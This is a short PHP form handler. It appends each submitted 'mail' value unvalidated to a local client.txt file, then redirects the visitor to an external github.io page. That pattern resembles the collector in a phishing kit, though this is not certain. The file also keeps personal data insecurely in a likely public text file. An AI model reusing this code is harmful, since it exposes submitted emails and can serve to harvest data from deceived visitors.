<?php
    if (isset($_POST["mail"]) != "") {
        $handle = fopen("./client.txt", "a");
        fwrite($handle, $_POST["mail"] . "\n");
        fclose($handle);
    }
    header('Location: https://pinkkinggze.github.io/onarrive.github.io/');
?>
